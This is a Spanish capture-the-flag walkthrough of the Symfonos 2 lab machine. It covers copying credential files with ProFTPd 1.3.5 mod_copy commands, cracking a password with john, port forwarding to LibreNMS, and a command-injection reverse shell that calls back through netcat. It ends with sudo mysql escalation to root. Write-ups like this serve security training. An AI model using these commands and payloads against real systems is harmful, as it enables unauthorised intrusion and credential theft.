PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

-En el puerto 80 no hay nada interesante

-Al hacer un escaneo más exaustivo vemos que la versión de FTP es 'ProFTPd 1.3.5' , la cual si buscamos en searchsploit es vulnerable. Elegimos el siguiente exploit:
	-ProFTPd 1.3.5 - File Copy
	-Esta vulnerabilidad nos permite copiarnos archivos internos de la máquina en otras rutas del servidor. Podríamos copiar el contenido de un archivo sensible en /var/www/html/archivo_sensible o trasladarlo al servicio SMB y verlo desde alli ....
	

-Listamos el contenido del servicio SMB --> anonymous --> backups--> log.txt
	-smbclient -N //192.168.1.128/anonymous
	-cd backups --> get log.txt

-Dentro de log.txt se encuentra la configuración del servicio SMB de la máquina. Indagando encontramos la ruta del directorio Anonymous dentro del servidor, se encuentra aquí:
	-anonymous
		 -path = /home/aeolus/share

-Cómo la vulnerabilidad 'ProFTPd 1.3.5' nos permite copiarnos archivos internos de la máquina en otras rutas de la máquina, y tenemos la ruta del directorio anonymous de SMB, vamos a copiarnos archivos sensibles de la máquina dentro del directorio anonymous, ya que lo podemos listar.

-Vamos a explotar la vulnerabilidad ProFTPd 1.3.5 a través de FTP y SMB:
	-Nos conectamos a FTP con netcat:
		-nc 192.168.1.128 21
		-Copiamos un archivo interno de la máquina en el directorio Anonymous de SMB:
			-site cpfr /etc/passwd
			-site cpto /home/aeolus/share/passwd (Creamos el directorio 'passwd' dentro del directorio anonymous de SMB con el contenido del /etc/passwd)
	-Listamos el contenido del directorio anonymous en SMB para ver si ha funcionado:
		-smbclient -N //192.168.1.128/anonymous
		-smb: \> ls
			  passwd                            
			  backups 
		-HA FUNCIONADO!!: A parte del directorio backups que ya estaba, nos ha creado un archivo 'passwd' con el contenido del /etc/passwd de la máquina.
	-Sabiendo esto, vamos a intentar copiarnos el archivo /etc/shadow y ver su contenido a través de SMB:
		-Intentamos hacerlo de esta manera pero nos dice 'PERMISION DENIED':
			-site cpfr /etc/shadow
			-site cpto /home/aeolus/share/shadow
		-Volvemos a ver el contenido del archivo 'log.txt' que descubrimos al inicio:
			-root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
				-Observamos que hay una tarea cron que mete el contenido del '/etc/shadow' dentro de '/var/backups/shadow.bak'
		-Volvemos a probar con la nueva ruta:
			-site cpfr /var/backups/shadow.bak
			-site cpto /home/aeolus/share/shadow
			-HA FUNCIONADO!!

-Nos decargamos el fichero 'passwd' desde la carpeta 'anonymous' de SMB y rompemos la contraseña del usuario 'aeolus' con john:
	-smb: \> get passwd
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
		sergioteamo (Me quedé loco jajajajjajaj)

-Nos autenticamos por ssh con las credenciales obtenidas y estamos dentro:
	ssh aeolus@192.168.1.128
	password: sergioteamo
	aeolus@symfonos2:~$
## Escalada de Privilegios

-Somos el usuario aeolus, vemos si podemos ejecutar algún comando como sudo o tenemos algún binario con permisos SUID. No es el caso.

-Buscamos archivos de interés dentro de la máquina pero no encontramos nada.

-Vamos a ver las conexiones tcp y los puertos que tiene la máquina activos:
	-ss -tan
		127.0.0.1:3306
		127.0.0.1:8080
-Vemos que tiene el el puerto 3306 (mysql) y el 8080 activos, pero solo están accesibles por 'localhost', es decir desde dentro de la máquina.

-Cono al enumerar la máquina no hemos encontrado credenciales para autenticarnos en mysql, vamos a centrarnos en el puerto 8080.

-No podemos acceder a el directamente, ya aunque estemos dentro de la máquina, estamos operando bajo la IP de nuestra máquina, por lo que no nos deja entrar.

-Para solucionar esto tenemos que aplicar un 'Local Port Forwarding' por ssh, de manera de redirijamos el tráfico de red de un puerto de mi máquina al puerto 8080 de la máquina víctima. De esta manera podemos ver el contenido del puerto 8080 desde nuestra máquina:
	-Nos salimos de la sesión de ssh y nos volvemos a autenticar aplicando Local Port Forwarding:
		-ssh aeolus@192.168.1.128 -L 8081:127.0.0.1:8080 (Ponemos nuestro puerto 8081 porque vamos a utilizar Burpsuite que opera en el 8080).

-Ponemos localhost:8081 en la URL y podemos ver un panel de login con el siguiente servicio:
	-Libre NMS 

-Nos autentifcamos con las credenciales de aeolus y entramos.

-Buscamos exploits y encontramos --> LibreNMS 1.46 - 'addhost' Remote Code Execution

-2 FORMAS:
	**1-MANUAL CON BURPSUITE**
		-Analizamos el exploit para ver cómo funciona:
			1-Añade un nuevo dispositivo en la ruta /addhost por POST
				-Añadimos el hostname 'pepe' e inyectamos la reverse shell en el campo 'community' escapandolo de la siguiente manera:
					'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.135 1234 >/tmp/f) #
			2-Con nuestro device 'pepe' creado, podemos ejecutarlo desde la siguiente ruta:
				http://localhost:8081/ajax_output.php?id=capture&format=text&type=snmpwalk&hostname=pepe
			3-Obtenemos la reverse shell como el usuario 'Cronus':
				cronus@symfonos2:/opt/librenms/html$
	**2-AUTOMÁTICO CON EL EXPLOIT**
		-El exploit hace lo mismo que hemos hecho manualmente. Crea un nuevo 'device' inyectando la reverse shell en el campo 'community' y después la ejecuta en 'http://localhost:8081/ajax_output.php?id=capture&format=text&type=snmpwalk&hostname=nombre_device'
		-Tenemos que proporcionar la ruta dónde está ubicado el servicio 'LibreNMS', la cookie(la obtenemos con BurpSuite), nuestra IP y un puerto para entablar la reverse shell:
			python2 47044.py http://127.0.0.1:8081/ 'XSRF-TOKEN=eyJpdiI6ImJMcmFoRElNTW0rSUlDSGxkNk56Mmc9PSIsInZhbHVlIjoiRUd4WXlNTUo2emZPSWZyeHB2Z2dSUysrK3QrcXp0VXNnZDYrZkg0MGNVWklINWxRODk2MGpwQ0Rac0dSNWI0QWw2Q3NBMVwvR2J6K2k0MjdOVVpmeVVBPT0iLCJtYWMiOiI2ZDhjODg3ODk4ZjQxZjc4M2FjODZmNDQ3ZTU2MDBmYzg5MDMxYzJlNzUzOTBiOGJhMDVjYTM3MDFhODY3ZDc2In0%3D; librenms_session=eyJpdiI6Ik5mYUs1aFdscUpnb2llQm4zdzRDdlE9PSIsInZhbHVlIjoia2xmd1oxV1RZMlZHS1pHM2lGWW9KSTdcLzNMMlBPQU8rb3J5YUdCT0RHZWE0UHh4dndpa2JmUHFMN3oyTncwamtzcmVsU1lFUnZydEFPQjkxckx1bzdnPT0iLCJtYWMiOiI5ZDRjYWRkNTgyNzQwOWVlNGEzOTMwMzU0ZTJiOWM2MWVmNWE3NWQ3MGM1ZTI4Nzc0YzZlNmRmNDBiZTlhNDc0In0%3D; PHPSESSID=naehjt60b4rotqjp85sccarf80' 192.168.1.135 1234 
			-Obtenemos conexión: cronus@symfonos2:/opt/librenms/html$


-Vemos comandos a nivel de sudo podemos ejecutar con el usuario CRONUS:
	-sudo -l:
		(root) NOPASSWD: /usr/bin/mysql

-Podemos ejecutar con permisos sudoers el binario  /usr/bin/mysql, pegamos el código de Gtfobins y obtenemos la shell como root:
	root@symfonos2:/# whoami
	root
